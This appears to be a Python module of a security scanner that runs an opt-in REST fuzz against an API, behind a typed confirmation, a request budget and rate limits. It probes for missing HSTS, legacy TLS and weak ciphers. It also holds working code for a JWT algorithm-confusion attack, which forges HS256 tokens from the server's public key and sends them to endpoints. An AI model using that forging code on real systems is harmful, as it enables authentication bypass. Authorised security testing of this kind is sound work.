"""REST crypto-posture fuzzer — Phase 96 FUZZ-01/02/03/04.

This module provides the CONFIRM gate, budget enforcement, and the active
request dispatch loop for opt-in REST crypto-posture fuzzing.

SAFETY DESIGN
-------------
- ``confirm_fuzz_gate`` is the FIRST call in any scan path. No network I/O
  occurs before the gate returns True.
- Non-TTY stdin causes a HARD ABORT (returns False). Unlike the nmap gate
  (quirk/util/targets.py::maybe_confirm_probe_budget which auto-proceeds in
  non-TTY), the fuzz gate NEVER auto-proceeds in headless/CI environments.
- TTY path requires the operator to type the literal word ``CONFIRM``; any
  other input (including "y", "yes", bare Enter) aborts cleanly.
- ``_resolve_budget`` enforces a hard ceiling of MAX_FUZZ_BUDGET=500 that
  cannot be bypassed via CLI args or config files.
- ``validate_external_url`` is called BEFORE every ``session.request()`` call.
  Rejected URLs are skipped and do NOT consume budget (T-96-04).
- ``TokenBucket.acquire()`` is called BEFORE every dispatch (T-96-05).
- Budget counter increments ONLY after ``session.request()`` returns (Pitfall 3).
- Loop breaks after 3 consecutive 5xx responses (T-96-05).

Gate functions are fully injectable (prompt_fn, stderr_print_fn, is_tty) so
tests never touch real sys.stdin/sys.stderr.

Threat mitigations:
- T-96-04: SSRF → validate_external_url before every dispatch
- T-96-05: DoS → budget cap + rate limit + 5xx cascade pause
- T-96-06: Token leak → no bearer/forged token in CryptoEndpoint fields
- T-96-07: HMAC secret disclosure → public key bytes; no disclosure risk
- T-96-08: iss/header-claim SSRF → probe never follows token claim key URLs; only /.well-known/jwks.json
"""

from __future__ import annotations

import json
import logging
import ssl
import socket
import sys
import warnings
from datetime import datetime, timezone
from typing import Any, Final, List, Optional
from urllib.parse import urlparse

import requests

from quirk.auth.credentials import CredentialContext
from quirk.engine.rate_limiter import TokenBucket
from quirk.models import CryptoEndpoint
from quirk.util.safe_exc import safe_str
from quirk.util.url_allowlist import validate_external_url

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Optional schemathesis import — present only when quirk[api] is installed
# ---------------------------------------------------------------------------

try:
    import schemathesis
    from schemathesis.core.result import Ok as _SchemaOk
    SCHEMATHESIS_AVAILABLE = True
except ImportError:
    SCHEMATHESIS_AVAILABLE = False
    _SchemaOk = None  # type: ignore[assignment,misc]

# ---------------------------------------------------------------------------
# Module-level constants (FUZZ-02)
# ---------------------------------------------------------------------------

#: Absolute hard ceiling on the number of HTTP requests the fuzzer may dispatch
#: in a single run. This value is enforced inside _resolve_budget() and cannot
#: be bypassed via CLI arguments or config files.
MAX_FUZZ_BUDGET: Final[int] = 500

#: Default number of HTTP requests to dispatch when the operator does not
#: specify --fuzz-budget.
DEFAULT_FUZZ_BUDGET: int = 50

#: Default rate cap in requests per second. Uses the TokenBucket primitive from
#: quirk/engine/rate_limiter.py (same pattern as the nmap scanner).
FUZZ_RATE_DEFAULT: float = 5.0

#: Number of consecutive 5xx responses that trigger a cascade pause/abort.
_CONSECUTIVE_5XX_LIMIT: int = 3


# ---------------------------------------------------------------------------
# Budget enforcement (FUZZ-02)
# ---------------------------------------------------------------------------

def _resolve_budget(requested: int | None) -> int:
    """Validate and return the effective request budget.

    Args:
        requested: Operator-supplied budget, or None to use DEFAULT_FUZZ_BUDGET.

    Returns:
        The effective budget (>= 1 and <= MAX_FUZZ_BUDGET).

    Raises:
        ValueError: If ``requested`` exceeds MAX_FUZZ_BUDGET. The message
            includes the substring "hard maximum" so tests can match it.
    """
    effective = requested if requested is not None else DEFAULT_FUZZ_BUDGET
    if effective > MAX_FUZZ_BUDGET:
        raise ValueError(
            f"Requested fuzz budget {effective} exceeds hard maximum {MAX_FUZZ_BUDGET}. "
            "Reduce --fuzz-budget."
        )
    return effective


# ---------------------------------------------------------------------------
# CONFIRM gate (FUZZ-03) — must be the first call before any network I/O
# ---------------------------------------------------------------------------

def confirm_fuzz_gate(
    budget: int,
    target_count: int,
    is_tty: bool | None = None,
    prompt_fn=input,
    stderr_print_fn=None,
) -> bool:
    """Return True if the operator has authorized the fuzz run; False to abort.

    CRITICAL difference from maybe_confirm_probe_budget (quirk/util/targets.py):
    - Non-TTY / headless context → HARD ABORT (returns False, prints error).
      The nmap gate auto-proceeds in non-TTY; the fuzz gate never does (FUZZ-03).
    - TTY context → present a budget summary and require the literal word
      ``CONFIRM`` (case-sensitive); any other input aborts.

    Args:
        budget:          Number of requests the fuzzer will dispatch at most.
        target_count:    Number of discovered endpoint targets (for UX display).
        is_tty:          Override for TTY detection. When None, auto-detects via
                         sys.stdin.isatty() (the correct check per run_scan.py:960).
        prompt_fn:       Callable accepting a prompt string and returning the
                         operator's answer. Defaults to built-in ``input``.
                         Injected in tests via ``lambda _: "CONFIRM"``.
        stderr_print_fn: Callable accepting a string, used for non-TTY error
                         messages. When None, falls back to ``print(..., file=sys.stderr)``.
                         Injected in tests via a list-appending lambda.

    Returns:
        True if fuzzing should proceed; False to abort (no requests sent).
    """
    if is_tty is None:
        is_tty = sys.stdin.isatty()

    if not is_tty:
        msg = (
            "ERROR: REST fuzzing requires interactive confirmation "
            "(non-TTY / headless mode detected). "
            "Fuzzing is disabled in non-interactive contexts. Aborting."
        )
        if stderr_print_fn is not None:
            stderr_print_fn(msg)
        else:
            print(msg, file=sys.stderr)
        return False  # HARD ABORT — never auto-proceed in non-TTY

    # TTY: present budget summary and require the exact literal word "CONFIRM"
    # Note: NO .strip() — "CONFIRM " (trailing space) and " CONFIRM" (leading space)
    # are intentionally rejected. The operator must type exactly "CONFIRM" with no
    # extra whitespace. This is the strictest interpretation of the FUZZ-03 spec.
    answer = prompt_fn(
        f"[QUIRK FUZZ] About to send up to {budget} active requests to "
        f"{target_count} endpoint(s).\n"
        "Type CONFIRM to proceed (any other input aborts): "
    )
    return answer == "CONFIRM"


# ---------------------------------------------------------------------------
# Crypto probes
# ---------------------------------------------------------------------------

def probe_hsts(response_headers: dict) -> bool:
    """Return True if the Strict-Transport-Security header is absent (a finding).

    Args:
        response_headers: Dict of response headers (lowercase keys as returned
            by requests).

    Returns:
        True when HSTS is missing (a crypto weakness); False when present.
    """
    hsts = response_headers.get("strict-transport-security", "")
    return not bool(hsts)


def _probe_tls_downgrade(host: str, port: int) -> bool:
    """Return True if the server accepts TLS 1.0 or TLS 1.1 (a crypto weakness).

    Attempts to open a TLS connection with each legacy version. Returns True
    on the first accepted version, False if all are rejected/refused.

    Wraps the deprecated TLSVersion constants with warnings.catch_warnings to
    suppress DeprecationWarning on Python 3.12+ (Pitfall 7).

    Args:
        host: Target hostname.
        port: Target port.

    Returns:
        True if TLS 1.0 or 1.1 is accepted; False otherwise.
    """
    for tls_ver in (ssl.TLSVersion.TLSv1_1, ssl.TLSVersion.TLSv1):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", DeprecationWarning)
            try:
                ctx.minimum_version = tls_ver
                ctx.maximum_version = tls_ver
            except (AttributeError, ssl.SSLError):
                continue
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            with socket.create_connection((host, port), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=host):
                    return True  # accepted legacy TLS version
        except (ssl.SSLError, OSError):
            continue  # refused or unsupported
    return False


def _probe_cipher_weak(host: str, port: int) -> bool:
    """Return True if the server accepts a known weak cipher suite.

    Uses stdlib ssl to attempt a connection with an explicit weak cipher list.
    Currently targets RC4, NULL, EXPORT, anon, and DES/3DES suites.

    Args:
        host: Target hostname.
        port: Target port.

    Returns:
        True if any weak cipher is negotiated; False otherwise.
    """
    # Known weak cipher patterns (matches openssl cipher string format)
    weak_cipher_string = "RC4:NULL:EXPORT:aNULL:LOW:3DES:DES"
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers(weak_cipher_string)
    except ssl.SSLError:
        # Platform does not support these (good — cipher string likely blocked)
        return False
    try:
        with socket.create_connection((host, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as tls_sock:
                negotiated = tls_sock.cipher()
                return negotiated is not None  # any cipher negotiated from the weak set
    except (ssl.SSLError, OSError):
        return False


def _is_http_url(url: str) -> bool:
    """Return True if the URL uses the http:// scheme (not https://)."""
    return urlparse(url).scheme == "http"


# ---------------------------------------------------------------------------
# JWT alg-confusion probe helpers
# ---------------------------------------------------------------------------

def _forge_hs256_token(bearer_token: str, public_key_pem: bytes) -> bytes | None:
    """Forge an HS256 token using the RS256 public key as the HMAC secret.

    This is the classic JWT alg-confusion attack: the server verifies with
    the public key, but the attacker signs with the same key as an HMAC secret.
    A vulnerable server will accept the forged token.

    Implementation note: PyJWT 2.x includes a security check that rejects
    asymmetric key material as HMAC secrets. To implement the alg-confusion
    attack correctly, we manually construct the JWT using stdlib hmac/hashlib
    with the PEM bytes as the raw HMAC-SHA256 key. This is the authentic
    attack vector — the HMAC key IS the raw PEM bytes.

    Args:
        bearer_token:    The original bearer JWT (must use alg=RS256).
        public_key_pem:  The RS256 public key in PEM format (used as HMAC secret).

    Returns:
        The forged HS256 token as bytes, or None if the source token is not
        RS256 (including alg:none, HS256, or any other algorithm).

    Security: The HMAC secret is the target's PUBLIC key — public by definition;
    no disclosure risk (T-96-07 accept disposition in threat register).
    """
    import base64
    import hashlib
    import hmac as _hmac
    import json

    try:
        import jwt  # PyJWT (core dep)
        header = jwt.get_unverified_header(bearer_token)
    except Exception:
        return None

    if header.get("alg", "").upper() != "RS256":
        return None  # only applicable to RS256 source tokens

    try:
        claims = jwt.decode(
            bearer_token,
            options={"verify_signature": False, "verify_exp": False},
            algorithms=["RS256"],
        )
    except Exception:
        return None

    try:
        # Manually construct HS256 JWT:
        # PyJWT 2.x rejects PEM bytes as HMAC secret (security check).
        # The authentic attack uses the raw PEM bytes as the HMAC-SHA256 key.
        forged_header = {"alg": "HS256", "typ": "JWT"}
        h_enc = base64.urlsafe_b64encode(
            json.dumps(forged_header, separators=(",", ":")).encode()
        ).rstrip(b"=")
        p_enc = base64.urlsafe_b64encode(
            json.dumps(claims, separators=(",", ":")).encode()
        ).rstrip(b"=")
        signing_input = h_enc + b"." + p_enc
        sig = _hmac.new(public_key_pem, signing_input, hashlib.sha256).digest()
        sig_enc = base64.urlsafe_b64encode(sig).rstrip(b"=")
        return signing_input + b"." + sig_enc
    except Exception:
        return None


def _fetch_jwks_public_key_pem(
    base_url: str,
    session: requests.Session,
    allow_internal: bool = False,
) -> bytes | None:
    """Fetch the RS256 public key from /.well-known/jwks.json on the in-scope base_url.

    Per Open Question 1 resolution (96-CONTEXT.md): the probe ONLY fetches
    /.well-known/jwks.json from the in-scope base_url. It NEVER follows iss
    claims or token header key-url hints — those are separate SSRF risks (T-96-08).

    Args:
        base_url:       The target base URL (scheme + host + optional port).
        session:        The requests.Session to use.
        allow_internal: Whether to allow internal/loopback targets.

    Returns:
        The first RS256 public key as PEM bytes, or None if not found/not RS256.
    """
    from urllib.parse import urljoin
    jwks_url = urljoin(base_url.rstrip("/") + "/", ".well-known/jwks.json")

    # Scope gate — still subject to validate_external_url (T-96-08)
    scope_result = validate_external_url(jwks_url, allow_internal=allow_internal)
    if not scope_result.ok:
        logger.debug("JWKS URL %s rejected by scope gate: %s", safe_str(jwks_url), scope_result.reason)
        return None

    try:
        resp = session.request("GET", jwks_url, timeout=10)
        if resp.status_code != 200:
            return None
        jwks = resp.json()
    except Exception as exc:
        logger.debug("JWKS fetch failed: %s", safe_str(str(exc)))
        return None

    # Extract the first RS256 public key from the JWKS
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
        import base64

        keys = jwks.get("keys", [])
        for key_entry in keys:
            if key_entry.get("kty") != "RSA":
                continue
            if key_entry.get("alg", "RS256") != "RS256":
                continue
            n_b64 = key_entry.get("n")
            e_b64 = key_entry.get("e")
            if not n_b64 or not e_b64:
                continue

            # Decode modulus and exponent from base64url
            def _b64url_to_int(b64: str) -> int:
                padded = b64 + "=" * (-len(b64) % 4)
                return int.from_bytes(base64.urlsafe_b64decode(padded), "big")

            n = _b64url_to_int(n_b64)
            e = _b64url_to_int(e_b64)

            from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
            pub_numbers = RSAPublicNumbers(e=e, n=n)
            pub_key = pub_numbers.public_key(default_backend())
            return pub_key.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
    except Exception as exc:
        logger.debug("JWKS key extraction failed: %s", safe_str(str(exc)))
        return None

    return None


# ---------------------------------------------------------------------------
# Timestamp helper
# ---------------------------------------------------------------------------

def _now_utc() -> datetime:
    return datetime.now(timezone.utc)


# ---------------------------------------------------------------------------
# Main fuzzer entry point (FUZZ-01)
# ---------------------------------------------------------------------------

def run_fuzz_scan(
    spec_dict: dict,
    base_url: str,
    cfg: Any,
    cred_ctx: Optional[CredentialContext] = None,
    budget: Optional[int] = DEFAULT_FUZZ_BUDGET,
    prompt_fn=input,
    is_tty: bool | None = None,
    run_alg_confusion: bool = False,
    _session: Optional[requests.Session] = None,
) -> List[CryptoEndpoint]:
    """Run the active REST crypto-posture fuzz scan against a target.

    Implements FUZZ-01 (TLS/cipher/HSTS/http-cred probes), FUZZ-02 (six
    guardrails), FUZZ-03 (gate-first), and FUZZ-04 (optional alg-confusion).

    Safety invariant: ``confirm_fuzz_gate`` is the FIRST executable statement.
    No network I/O of any kind precedes it. (Pitfall 1)

    Args:
        spec_dict:        Parsed OpenAPI spec dict (Phase 94 output).
        base_url:         Target base URL (e.g. "https://api.example.com").
        cfg:              QUIRK scan configuration (provides cfg.security.*).
        cred_ctx:         Optional credential context (bearer token for alg-confusion).
        budget:           Max requests to dispatch (None → DEFAULT_FUZZ_BUDGET).
        prompt_fn:        Injectable TTY prompt function (tests pass lambda).
        is_tty:           Override TTY detection (None = auto-detect).
        run_alg_confusion: If True, attempt JWT RS256→HS256 alg-confusion probe.
        _session:         Injectable requests.Session (tests inject mock session).

    Returns:
        List of CryptoEndpoint findings with protocol="REST_FUZZ".
    """
    # FIRST: gate check — no network I/O before this returns True (FUZZ-03 / Pitfall 1)
    effective_budget = _resolve_budget(budget)
    target_count = len(spec_dict.get("paths", {}) or {})

    if not confirm_fuzz_gate(
        effective_budget,
        target_count,
        is_tty=is_tty,
        prompt_fn=prompt_fn,
    ):
        return []

    # Graceful degradation: schemathesis not installed → missing_extra finding
    if not SCHEMATHESIS_AVAILABLE:
        return [CryptoEndpoint(
            host=urlparse(base_url).hostname or base_url[:64],
            port=urlparse(base_url).port or 443,
            protocol="REST_FUZZ",
            service_detail="schemathesis not installed",
            severity="INFO",
            scan_error_category="missing_extra",
            scanned_at=_now_utc(),
        )]

    findings: List[CryptoEndpoint] = []
    allow_internal: bool = bool(getattr(getattr(cfg, "security", None), "allow_internal_targets", False))

    session = _session if _session is not None else requests.Session()

    # Rate limiter — 5 req/s (FUZZ-02 guardrail 3)
    limiter = TokenBucket(rate_per_sec=FUZZ_RATE_DEFAULT, capacity=FUZZ_RATE_DEFAULT)

    parsed_base = urlparse(base_url)
    host = parsed_base.hostname or ""
    port = parsed_base.port or (443 if parsed_base.scheme == "https" else 80)

    budget_used = 0
    consecutive_5xx = 0
    _scanned_at = _now_utc()

    # Alg-confusion pre-check: fetch public key ONCE before the dispatch loop
    alg_confusion_pub_pem: Optional[bytes] = None
    alg_confusion_bearer: Optional[str] = None
    alg_confusion_info_emitted = False

    if run_alg_confusion and cred_ctx is not None and cred_ctx.scheme == "bearer":
        declared_alg = cred_ctx.bearer_declared_alg()
        if declared_alg and declared_alg.upper() == "RS256":
            alg_confusion_bearer = cred_ctx._secret_buf.decode("utf-8")
            alg_confusion_pub_pem = _fetch_jwks_public_key_pem(
                base_url, session, allow_internal=allow_internal
            )
            if alg_confusion_pub_pem is None:
                # No public key available — emit INFO probe_skipped and skip alg-confusion
                findings.append(CryptoEndpoint(
                    host=host,
                    port=port,
                    protocol="REST_FUZZ",
                    service_detail="probe_skipped",
                    severity="INFO",
                    scanned_at=_scanned_at,
                ))
                alg_confusion_info_emitted = True
                alg_confusion_bearer = None  # prevent any alg-confusion requests

    # Enumerate GET-only operations via schemathesis (FUZZ-02 guardrail 1)
    try:
        schema = schemathesis.openapi.from_dict(spec_dict)
        get_schema = schema.include(method="GET")

        for result in get_schema.get_all_operations():
            # Budget check (FUZZ-02 guardrail 2)
            if budget_used >= effective_budget:
                break

            # Only process successful schema results (Anti-Pattern: never call is_ok())
            if not isinstance(result, _SchemaOk):
                continue

            op = result.ok()
            case = op.as_strategy().example()
            kwargs = case.as_transport_kwargs(base_url=base_url)

            url = kwargs.get("url", "")

            # Scope gate: validate BEFORE dispatch, no budget consumed on rejection (Pitfall 3 / T-96-04)
            scope_result = validate_external_url(url, allow_internal=allow_internal)
            if not scope_result.ok:
                logger.warning(
                    "Fuzz target URL rejected by scope gate (%s): %s",
                    scope_result.reason,
                    safe_str(url),
                )
                continue  # skip — no budget consumed

            # Rate limit: acquire token BEFORE dispatch (FUZZ-02 guardrail 3)
            limiter.acquire()

            # Ensure a timeout is set
            kwargs.setdefault("timeout", 10)

            try:
                response = session.request(**kwargs)
                # Budget counter increments ONLY after successful dispatch (Pitfall 3)
                budget_used += 1
            except Exception as exc:
                logger.warning("Fuzz request failed: %s", safe_str(str(exc)))
                consecutive_5xx = 0
                continue

            resp_status = getattr(response, "status_code", 0)
            resp_headers = dict(getattr(response, "headers", {}))

            # 5xx cascade tracker (FUZZ-02 guardrail 6)
            if resp_status >= 500:
                consecutive_5xx += 1
                if consecutive_5xx >= _CONSECUTIVE_5XX_LIMIT:
                    logger.warning(
                        "REST fuzzer: %d consecutive 5xx responses; pausing scan.", _CONSECUTIVE_5XX_LIMIT
                    )
                    break
            else:
                consecutive_5xx = 0

            # ---- Crypto probes ----

            # HSTS probe
            if probe_hsts(resp_headers):
                findings.append(CryptoEndpoint(
                    host=host,
                    port=port,
                    protocol="REST_FUZZ",
                    service_detail="hsts_missing",
                    severity="HIGH",
                    scanned_at=_scanned_at,
                ))

            # TLS downgrade probe (only for https targets — probe at socket level)
            if parsed_base.scheme == "https":
                try:
                    if _probe_tls_downgrade(host, port):
                        findings.append(CryptoEndpoint(
                            host=host,
                            port=port,
                            protocol="REST_FUZZ",
                            service_detail="tls_downgrade_accepted",
                            severity="HIGH",
                            scanned_at=_scanned_at,
                        ))
                except Exception as exc:
                    logger.debug("TLS downgrade probe error: %s", safe_str(str(exc)))

            # Cipher probe (only for https targets)
            if parsed_base.scheme == "https":
                try:
                    if _probe_cipher_weak(host, port):
                        findings.append(CryptoEndpoint(
                            host=host,
                            port=port,
                            protocol="REST_FUZZ",
                            service_detail="cipher_weak",
                            severity="HIGH",
                            scanned_at=_scanned_at,
                        ))
                except Exception as exc:
                    logger.debug("Cipher probe error: %s", safe_str(str(exc)))

            # HTTP-only credential probe:
            # ONLY fires for spec-declared http:// endpoints (Open Question 2 resolution).
            # NEVER downgrades https:// URLs to http://.
            if _is_http_url(url) and cred_ctx is not None:
                findings.append(CryptoEndpoint(
                    host=host,
                    port=port,
                    protocol="REST_FUZZ",
                    service_detail="http_creds",
                    severity="HIGH",
                    scanned_at=_scanned_at,
                ))

            # ---- Alg-confusion probe (FUZZ-04) ----
            if (
                run_alg_confusion
                and alg_confusion_bearer is not None
                and alg_confusion_pub_pem is not None
            ):
                forged = _forge_hs256_token(alg_confusion_bearer, alg_confusion_pub_pem)
                if forged is not None:
                    # Dispatch the forged token to this endpoint
                    alg_kwargs = {
                        "method": "GET",
                        "url": url,
                        "headers": {"Authorization": f"Bearer {forged.decode('utf-8')}"},
                        "timeout": 10,
                    }
                    # Scope gate for alg-confusion request
                    alg_scope = validate_external_url(url, allow_internal=allow_internal)
                    if alg_scope.ok:
                        limiter.acquire()
                        try:
                            alg_resp = session.request(**alg_kwargs)
                            alg_status = getattr(alg_resp, "status_code", 0)
                            if 200 <= alg_status < 300:
                                # Server accepted the forged HS256 token — CRITICAL
                                findings.append(CryptoEndpoint(
                                    host=host,
                                    port=port,
                                    protocol="REST_FUZZ",
                                    # No raw token in any field — T-96-06
                                    service_detail="alg_confusion",
                                    severity="CRITICAL",
                                    scanned_at=_scanned_at,
                                ))
                        except Exception as exc:
                            logger.debug("Alg-confusion probe request failed: %s", safe_str(str(exc)))

    except Exception as exc:
        logger.error("REST fuzz scan error: %s", safe_str(str(exc)))

    return findings
